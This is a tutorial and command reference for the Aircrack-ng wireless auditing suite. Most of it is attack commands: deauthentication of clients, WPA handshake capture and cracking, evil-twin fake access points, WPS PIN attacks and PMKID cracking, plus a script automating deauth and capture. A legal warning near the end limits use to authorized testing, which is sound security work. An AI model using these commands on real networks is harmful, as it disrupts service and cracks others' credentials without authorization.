# Aircrack-ng Suite

## Introduction

## What is Aircrack-ng?

Aircrack-ng is a complete suite of tools to assess WiFi network security. It focuses on four main areas: monitoring (packet capture and export), attacking (replay attacks, deauthentication, fake access points), testing (checking WiFi cards and driver capabilities), and cracking (WEP and WPA/WPA2-PSK passwords). The suite includes various tools that work together to audit wireless networks.

## Why Aircrack-ng?

- Comprehensive wireless security toolkit
- WEP and WPA/WPA2 cracking
- Monitor mode support
- Packet injection capabilities
- Cross-platform (Linux, Windows, macOS)
- Open-source and actively maintained
- Industry standard for WiFi auditing
- Extensive driver support
- Well-documented

## Learning Path

1. Understand 802.11 wireless fundamentals
2. Learn WEP/WPA/WPA2 encryption
3. Install and configure Aircrack-ng
4. Practice packet capture
5. Master attack techniques
6. Study WPA handshake analysis

## User Guide

## Prerequisites

- Basic understanding of wireless networking
- Compatible wireless adapter
- Root/administrator privileges
- Knowledge of 802.11 protocols

Verify installation:

```bash
aircrack-ng --help
```

## Installation

### Ubuntu/Debian

```bash
sudo apt update
sudo apt install aircrack-ng
```

### Kali Linux

```bash
# Pre-installed on Kali Linux
aircrack-ng --version

# Update if needed
sudo apt update && sudo apt upgrade aircrack-ng
```

### RHEL/CentOS/Fedora

```bash
sudo dnf install aircrack-ng
```

### macOS

```bash
# Using Homebrew
brew install aircrack-ng
```

### Arch Linux

```bash
sudo pacman -S aircrack-ng
```

### From source

```bash
# Install dependencies
sudo apt install build-essential autoconf automake libtool pkg-config \
    libnl-3-dev libnl-genl-3-dev libssl-dev ethtool shtool rfkill zlib1g-dev \
    libpcap-dev libsqlite3-dev libpcre3-dev libhwloc-dev libcmocka-dev

# Download and compile
wget https://download.aircrack-ng.org/aircrack-ng-1.7.tar.gz
tar xzf aircrack-ng-1.7.tar.gz
cd aircrack-ng-1.7
autoreconf -i
./configure --with-experimental
make
sudo make install
```

## Suite Components

### Core tools

```
airmon-ng      - Enable/disable monitor mode
airodump-ng    - Packet capture and network discovery
aireplay-ng    - Packet injection and attacks
aircrack-ng    - WEP and WPA/WPA2 password cracking
airdecap-ng    - Decrypt WEP/WPA/WPA2 captures
airdecloak-ng  - Remove WEP cloaking from pcap
airbase-ng     - Create fake access points
packetforge-ng - Create custom encrypted packets
airolib-ng     - Store and manage password lists
airserv-ng     - Allow access to wireless card from other computers
```

### Additional tools

```
airdrop-ng     - Deauthentication tool
airdriver-ng   - Driver management
airtun-ng      - Virtual tunnel interface
besside-ng     - Automated WPA cracking
easside-ng     - Automated WEP cracking
tkiptun-ng     - WPA/TKIP attack tool
wesside-ng     - Automated WEP key recovery
```

## Basic Workflow

### 1. Enable monitor mode

```bash
# Check wireless interface
iwconfig

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Interface becomes wlan0mon (or mon0)
```

### 2. Discover networks

```bash
# Scan for networks
sudo airodump-ng wlan0mon

# Scan specific channel
sudo airodump-ng -c 6 wlan0mon

# Scan specific band
sudo airodump-ng --band a wlan0mon  # 5GHz
sudo airodump-ng --band bg wlan0mon # 2.4GHz
```

### 3. Capture packets

```bash
# Capture on specific channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

### 4. Deauthenticate clients (optional)

```bash
# Deauth to capture handshake
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### 5. Crack password

```bash
# WPA/WPA2 with dictionary
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

## Airmon-ng (Monitor Mode)

### Basic usage

```bash
# Show wireless interfaces
airmon-ng

# Enable monitor mode
sudo airmon-ng start wlan0

# Enable on specific channel
sudo airmon-ng start wlan0 6

# Disable monitor mode
sudo airmon-ng stop wlan0mon
```

### Check for interfering processes

```bash
# Check and kill
sudo airmon-ng check kill

# Manual check
sudo airmon-ng check
```

## Airodump-ng (Packet Capture)

### Basic capture

```bash
# Scan all channels
sudo airodump-ng wlan0mon

# Specific channel
sudo airodump-ng -c 6 wlan0mon

# Output to file
sudo airodump-ng -c 6 -w capture wlan0mon

# Target specific BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

### Output formats

```bash
# Default formats (cap, csv, kismet)
sudo airodump-ng -w capture wlan0mon

# PCAP only
sudo airodump-ng -w capture --output-format pcap wlan0mon

# Multiple formats
sudo airodump-ng -w capture --output-format pcap,csv wlan0mon
```

### Display options

```bash
# Show only clients
sudo airodump-ng --showack wlan0mon

# Update interval
sudo airodump-ng --update 10 wlan0mon

# Show WPS networks
sudo airodump-ng --wps wlan0mon

# Show manufacturer
sudo airodump-ng --manufacturer wlan0mon
```

### Frequency bands

```bash
# 2.4GHz only
sudo airodump-ng --band bg wlan0mon

# 5GHz only
sudo airodump-ng --band a wlan0mon

# Both bands
sudo airodump-ng --band abg wlan0mon
```

## Aireplay-ng (Packet Injection)

### Test injection

```bash
# Test injection capability
sudo aireplay-ng --test wlan0mon

# Test against specific AP
sudo aireplay-ng --test -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Deauthentication attack

```bash
# Deauth single client
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Deauth all clients
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Targeted deauth (capture handshake)
sudo aireplay-ng --deauth 5 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon
```

### Fake authentication

```bash
# Associate with open network
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# With timing
sudo aireplay-ng --fakeauth 30 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### ARP replay attack (WEP)

```bash
# Replay ARP packets
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
```

### Interactive packet replay

```bash
# Choose packet to replay
sudo aireplay-ng --interactive -b AA:BB:CC:DD:EE:FF wlan0mon
```

## Aircrack-ng (Password Cracking)

### WEP cracking

```bash
# Crack WEP
aircrack-ng capture-01.cap

# With specific BSSID
aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap

# Statistical attack
aircrack-ng -K capture-01.cap
```

### WPA/WPA2 cracking

```bash
# Dictionary attack
aircrack-ng -w wordlist.txt capture-01.cap

# Specific BSSID
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# Multiple capture files
aircrack-ng -w wordlist.txt capture-*.cap

# With ESSID
aircrack-ng -w wordlist.txt -e "NetworkName" capture-01.cap
```

### Performance options

```bash
# Multiple cores
aircrack-ng -w wordlist.txt capture-01.cap

# Multiple wordlists
aircrack-ng -w wordlist1.txt,wordlist2.txt capture-01.cap
```

## WPA Handshake Capture

### Complete workflow

```bash
# 1. Start monitor mode
sudo airmon-ng start wlan0

# 2. Scan for targets
sudo airodump-ng wlan0mon

# 3. Capture on target channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# 4. In new terminal, deauth client
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# 5. Wait for "WPA handshake: AA:BB:CC:DD:EE:FF"

# 6. Crack
aircrack-ng -w wordlist.txt handshake-01.cap
```

### Verify handshake

```bash
# Check if handshake captured
aircrack-ng handshake-01.cap

# Look for "1 handshake" in output
```

## Airdecap-ng (Decryption)

### Decrypt WEP

```bash
# With WEP key (hex)
airdecap-ng -w 1234567890 capture.cap

# Output to file
airdecap-ng -w 1234567890 capture.cap -o decrypted.cap
```

### Decrypt WPA/WPA2

```bash
# With passphrase
airdecap-ng -e "NetworkName" -p password capture.cap

# With specific BSSID
airdecap-ng -b AA:BB:CC:DD:EE:FF -e "NetworkName" -p password capture.cap
```

## Airbase-ng (Fake AP)

### Create fake access point

```bash
# Basic fake AP
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# With WEP
sudo airbase-ng -e "Network" -c 6 -W 1 wlan0mon

# Evil twin (same SSID as target)
sudo airbase-ng -a AA:BB:CC:DD:EE:FF -e "TargetNetwork" -c 6 wlan0mon

# With response to all probes
sudo airbase-ng -P -C 30 wlan0mon
```

## Airolib-ng (Password Database)

### Create and manage database

```bash
# Create database
airolib-ng passwords.db --import essid essids.txt
airolib-ng passwords.db --import passwd wordlist.txt

# Batch compute PMKs
airolib-ng passwords.db --batch

# Clean database
airolib-ng passwords.db --clean all

# Statistics
airolib-ng passwords.db --stats

# Verify
airolib-ng passwords.db --verify all
```

### Use with aircrack-ng

```bash
# Crack using airolib database
aircrack-ng -r passwords.db capture-01.cap
```

## Packetforge-ng (Packet Creation)

### Create ARP packet

```bash
# Forge ARP packet
packetforge-ng --arp -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 \
    -k 192.168.1.1 -l 192.168.1.100 -y fragment.xor -w arp-packet
```

## Besside-ng (Automated WPA)

### Automated attack

```bash
# Automated WPA cracking
sudo besside-ng -c 6 wlan0mon

# Specific BSSID
sudo besside-ng -b AA:BB:CC:DD:EE:FF wlan0mon

# With WPA/WPS
sudo besside-ng -W wlan0mon
```

## Compatible Wireless Adapters

### Recommended chipsets

```
- Atheros AR9271 (USB)
- Ralink RT3070/RT3572 (USB)
- Realtek RTL8187L (USB)
- Intel Centrino (laptop)
- Atheros AR928X (laptop)
```

### Check compatibility

```bash
# Check card capabilities
sudo airmon-ng

# Test injection
sudo aireplay-ng --test wlan0mon
```

### Popular adapters

```
- Alfa AWUS036NHA (Atheros AR9271)
- Alfa AWUS036ACH (Realtek RTL8812AU)
- TP-Link TL-WN722N v1 (Atheros AR9271)
- Panda PAU09 (Ralink RT5372)
```

## Advanced Techniques

### WPS attack (Reaver integration)

```bash
# WPS PIN attack
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Pixie dust attack
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K
```

### Evil twin with captive portal

```bash
# Create fake AP
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# Configure interface
sudo ifconfig at0 192.168.1.1 netmask 255.255.255.0

# Start DHCP server
sudo dnsmasq -C dnsmasq.conf -d

# Redirect to captive portal
# (requires web server and iptables rules)
```

### PMKID attack (hashcat)

```bash
# Capture PMKID
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Convert for hashcat
hcxpcaptool -z pmkid.16800 capture.pcapng

# Crack with hashcat
hashcat -m 16800 pmkid.16800 wordlist.txt
```

## Scripting and Automation

### Automated handshake capture

```bash
#!/bin/bash
# capture-handshake.sh

INTERFACE="wlan0"
CHANNEL="6"
BSSID="AA:BB:CC:DD:EE:FF"
CLIENT="11:22:33:44:55:66"

# Start monitor mode
sudo airmon-ng start $INTERFACE

# Start capture
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w handshake ${INTERFACE}mon &
AIRODUMP_PID=$!

# Wait for capture to start
sleep 5

# Deauth
sudo aireplay-ng --deauth 10 -a $BSSID -c $CLIENT ${INTERFACE}mon

# Wait for handshake
sleep 30

# Stop capture
sudo kill $AIRODUMP_PID

echo "Handshake capture complete!"
```

## Troubleshooting

### Monitor mode won't start

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Manual method
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Check mode
iwconfig wlan0
```

### No injection

```bash
# Test injection
sudo aireplay-ng --test wlan0mon

# Check driver
lsmod | grep -i wireless

# Update drivers
sudo apt update
sudo apt install linux-headers-$(uname -r)
```

### Can't capture handshake

```bash
# Ensure client is connected
sudo airodump-ng -c 6 --bssid [AP_MAC] wlan0mon

# Increase deauth packets
sudo aireplay-ng --deauth 20 -a [AP_MAC] wlan0mon

# Try different client
sudo aireplay-ng --deauth 10 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon
```

### Adapter not detected

```bash
# Check USB connection
lsusb

# Check driver loaded
lsmod | grep rtl\|ath\|rt

# Install firmware
sudo apt install firmware-linux firmware-linux-nonfree
```

## Security and Legal Considerations

### ⚠️ Legal Warning

- **ONLY audit networks you own or have explicit written authorization to test**
- Unauthorized wireless network access is illegal
- Deauthentication attacks can be considered DoS
- Capturing handshakes may violate wiretapping laws
- Password cracking without permission is illegal
- Can result in criminal charges and civil liability
- Always obtain proper authorization

### Ethical usage

```bash
# Legitimate uses:
# - Testing your own network security
# - Authorized penetration testing
# - Educational purposes (isolated lab)
# - Security research (controlled environment)
# - Network troubleshooting (with permission)

# Best practices:
# - Document all authorization
# - Limit scope and impact
# - Don't attack production networks
# - Secure captured data
# - Follow responsible disclosure
# - Respect privacy
# - Know local laws
```

## Quick Reference

### Common workflow

```bash
# 1. Monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 2. Scan
sudo airodump-ng wlan0mon

# 3. Capture
sudo airodump-ng -c [CH] --bssid [AP_MAC] -w capture wlan0mon

# 4. Deauth (new terminal)
sudo aireplay-ng --deauth 10 -a [AP_MAC] -c [CLIENT_MAC] wlan0mon

# 5. Crack
aircrack-ng -w wordlist.txt capture-01.cap

# 6. Stop monitor mode
sudo airmon-ng stop wlan0mon
```

### Essential commands

```bash
# Monitor mode
airmon-ng start wlan0
airmon-ng stop wlan0mon

# Scan
airodump-ng wlan0mon

# Capture
airodump-ng -c 6 --bssid [MAC] -w file wlan0mon

# Deauth
aireplay-ng --deauth 10 -a [AP] -c [CLIENT] wlan0mon

# Crack WPA
aircrack-ng -w wordlist.txt capture.cap

# Decrypt
airdecap-ng -e "SSID" -p password capture.cap
```

## Real-World Examples

### Home network audit

```bash
# Test your own WiFi security

# 1. Monitor mode
sudo airmon-ng start wlan0

# 2. Capture handshake
sudo airodump-ng -c 6 --bssid [YOUR_AP_MAC] -w test wlan0mon

# 3. Disconnect and reconnect device to capture handshake

# 4. Test password strength
aircrack-ng -w /usr/share/wordlists/rockyou.txt test-01.cap
```

### Security assessment report

```bash
#!/bin/bash
# wireless-assessment.sh

REPORT="wifi-assessment-$(date +%Y%m%d).txt"

echo "Wireless Security Assessment" > $REPORT
echo "Date: $(date)" >> $REPORT
echo "" >> $REPORT

# Scan networks
sudo airodump-ng wlan0mon --output-format csv -w scan

# Parse results
echo "Networks Found:" >> $REPORT
cat scan-01.csv | grep -v "BSSID" | awk -F',' '{print $14,$6}' >> $REPORT
```

## Integration with Other Tools

### Hashcat

```bash
# Convert for hashcat
aircrack-ng -J hashcat capture-01.cap

# Crack with GPU
hashcat -m 2500 hashcat.hccapx wordlist.txt
```

### Wireshark

```bash
# Decrypt and analyze
airdecap-ng -e "SSID" -p password capture.cap
wireshark capture-dec.cap
```

### John the Ripper

```bash
# Convert WPA to John format
aircrack-ng -J john capture-01.cap

# Crack
john --wordlist=wordlist.txt john.hccap
```

## Resources

- [Aircrack-ng official site](https://www.aircrack-ng.org/)
- [Documentation](https://www.aircrack-ng.org/documentation.html)
- [GitHub repository](https://github.com/aircrack-ng/aircrack-ng)
- [Forum](https://forum.aircrack-ng.org/)
- [Compatible adapters](https://www.aircrack-ng.org/doku.php?id=compatibility_drivers)

## Next Steps

- Learn 802.11 protocol in depth
- Study WPA/WPA2 encryption
- Practice in isolated environment
- Obtain compatible wireless adapter
- Explore WPS vulnerabilities
- Learn about WPA3
- Get security certifications (CEH, OSCP)
- Contribute to Aircrack-ng project
- Join wireless security communities
